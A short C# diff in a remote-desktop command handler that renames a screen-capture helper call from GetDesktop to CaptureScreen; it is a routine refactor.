@@ -62,7 +62,7 @@ namespace xClient.Core.Commands
                     Bitmap desktop = null;
                     try
                     {
-                        desktop = RemoteDesktopHelper.GetDesktop(command.Monitor);
+                        desktop = RemoteDesktopHelper.CaptureScreen(command.Monitor);
                         desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                             ImageLockMode.ReadWrite, desktop.PixelFormat);
 
